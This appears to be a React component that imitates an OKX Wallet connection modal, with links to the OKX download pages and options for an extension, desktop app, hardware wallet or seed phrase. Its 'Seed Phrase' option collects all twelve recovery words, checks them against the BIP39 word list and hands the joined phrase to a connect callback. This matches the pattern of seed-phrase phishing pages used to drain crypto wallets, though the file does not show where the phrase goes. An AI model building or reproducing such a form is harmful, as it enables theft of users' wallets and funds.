'use client';

import { useState } from 'react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';
import { X, ArrowLeft } from 'lucide-react';



export default function OKXWalletModal({ onClose, onConnect, onBack }) {
  const [selectedOption, setSelectedOption] = useState(null);
  const [seedWords, setSeedWords] = useState(Array(12).fill(''));
  const [invalidWords, setInvalidWords] = useState(new Set());

  const handleWordChange = (index, value) => {
    const normalized = value.toLowerCase().trim();
    const nextWords = [...seedWords];
    nextWords[index] = normalized;
    setSeedWords(nextWords);

    const nextInvalid = new Set(invalidWords);
    if (normalized && !isValidBip39Word(normalized)) {
      nextInvalid.add(index);
    } else {
      nextInvalid.delete(index);
    }
    setInvalidWords(nextInvalid);
  };

  const handleSeedConnect = () => {
    const filledWords = seedWords.filter((word) => word.length > 0);
    const allValid = filledWords.length === 12 && invalidWords.size === 0;
    if (allValid) {
      onConnect('OKX Wallet', { method: 'seedPhrase', phrase: seedWords.join(' ') });
      onClose();
    }
  };

  const handleHardwareConnect = () => {
    onConnect('OKX Wallet', { method: 'hardwareWallet' });
    onClose();
  };

  const filledCount = seedWords.filter((word) => word.length > 0).length;
  const missingCount = 12 - filledCount;
  const isSeedComplete = filledCount === 12 && invalidWords.size === 0;

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {selectedOption ? (
            <button className="close-btn" onClick={() => setSelectedOption(null)} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : onBack ? (
            <button className="close-btn" onClick={onBack} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : null}
          <h2 style={{ margin: 0, textAlign: 'center' }}>OKX Wallet</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          {!selectedOption ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/OKX Icon.png" alt="OKX Wallet" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Pick how you want to connect your OKX Wallet. Choose Brave Extension, Desktop App, Seed Phrase, or Hardware Wallet.
                </p>
              </div>

              <div style={{ display: 'grid', gap: 12, marginBottom: 24 }}>
                {[
                  { label: 'Brave Extension', description: 'Open the OKX extension in Brave via the Chrome Web Store.', method: 'braveExtension' },
                  { label: 'Desktop App', description: 'Open the OKX Desktop App to connect directly.', method: 'desktopApp' },
                  { label: 'Seed Phrase', description: 'Recover using your OKX wallet seed phrase.', method: 'seedPhrase' },
                  { label: 'Hardware Wallet', description: 'Connect a Ledger or Trezor device with OKX.', method: 'hardwareWallet' },
                ].map((option) => (
                  <button
                    key={option.method}
                    type="button"
                    onClick={() => setSelectedOption(option.method)}
                    style={{
                      width: '100%',
                      textAlign: 'left',
                      padding: 16,
                      borderRadius: 14,
                      border: '1px solid rgba(255,255,255,0.15)',
                      background: 'rgba(255,255,255,0.03)',
                      color: 'var(--text)',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.08)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.03)';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <div>
                        <div style={{ fontSize: 15, fontWeight: 700, marginBottom: 4 }}>{option.label}</div>
                        <div style={{ fontSize: 13, color: 'var(--text-dim)' }}>{option.description}</div>
                      </div>
                      <span style={{ color: 'var(--cyan)', fontSize: 18 }}>→</span>
                    </div>
                  </button>
                ))}
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>OKX Resources</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://chrome.google.com/webstore/search/okx%20wallet"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/brave-brow-icon.svg" alt="Brave" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Brave Extension Search</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://www.okx.com/wallet/download"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/website-4946.svg" alt="Desktop" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Desktop App Download</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                </div>
              </div>
            </>
          ) : selectedOption === 'braveExtension' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Install or open OKX Wallet in Brave via the Chrome Web Store.
              </p>
              <a
                href="https://chrome.google.com/webstore/search/okx%20wallet"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  display: 'block',
                  width: '100%',
                  textAlign: 'center',
                  padding: 12,
                  borderRadius: 8,
                  border: 'none',
                  background: 'var(--cyan)',
                  color: 'var(--bg)',
                  textDecoration: 'none',
                  fontWeight: 600,
                }}
              >
                Open Brave Extension Listing
              </a>
            </>
          ) : selectedOption === 'desktopApp' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Use the OKX desktop application to connect your wallet securely.
              </p>
              <a
                href="https://www.okx.com/wallet/download"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  display: 'block',
                  width: '100%',
                  textAlign: 'center',
                  padding: 12,
                  borderRadius: 8,
                  border: 'none',
                  background: 'var(--cyan)',
                  color: 'var(--bg)',
                  textDecoration: 'none',
                  fontWeight: 600,
                }}
              >
                Open Desktop App Download
              </a>
            </>
          ) : selectedOption === 'seedPhrase' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your OKX wallet seed phrase to recover your wallet.
              </p>
              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(2, 1fr)',
                gap: 12,
                marginBottom: 20,
                maxHeight: 380,
                overflowY: 'auto',
                paddingRight: 8,
              }}>
                {seedWords.map((word, index) => (
                  <div key={index} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 13, color: 'var(--text-dim)', minWidth: 20 }}>{index + 1}</span>
                    <input
                      type="text"
                      placeholder="Word"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      style={{
                        flex: 1,
                        padding: '8px 10px',
                        border: `1px solid ${invalidWords.has(index) ? '#ff4444' : 'rgba(255,255,255,0.2)'}`,
                        borderRadius: 8,
                        background: 'transparent',
                        color: 'var(--text)',
                        fontSize: 12,
                        outline: 'none',
                      }}
                      onFocus={(e) => {
                        e.target.style.borderColor = invalidWords.has(index) ? '#ff4444' : 'var(--cyan)';
                      }}
                      onBlur={(e) => {
                        e.target.style.borderColor = invalidWords.has(index) ? '#ff4444' : 'rgba(255,255,255,0.2)';
                      }}
                    />
                  </div>
                ))}
              </div>
              <div style={{ textAlign: 'center', marginBottom: 20 }}>
                {missingCount > 0 ? (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>Missing words: <span style={{ color: 'var(--cyan)' }}>{missingCount}</span></p>
                ) : invalidWords.size > 0 ? (
                  <p style={{ color: '#ff4444', fontSize: 13, margin: 0 }}>Invalid words: {invalidWords.size}</p>
                ) : (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>All words valid</p>
                )}
              </div>
              <button
                onClick={handleSeedConnect}
                disabled={!isSeedComplete}
                style={{
                  width: '100%',
                  padding: 12,
                  border: 'none',
                  borderRadius: 8,
                  background: isSeedComplete ? 'var(--cyan)' : 'rgba(255,255,255,0.1)',
                  color: isSeedComplete ? 'var(--bg)' : 'var(--text-dim)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: isSeedComplete ? 'pointer' : 'not-allowed',
                }}
              >
                Connect Wallet
              </button>
            </>
          ) : (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Connect a hardware wallet to OKX directly.
              </p>
              <button
                onClick={handleHardwareConnect}
                style={{
                  width: '100%',
                  padding: 12,
                  border: 'none',
                  borderRadius: 8,
                  background: 'var(--cyan)',
                  color: 'var(--bg)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: 'pointer',
                }}
              >
                Connect Hardware Wallet
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
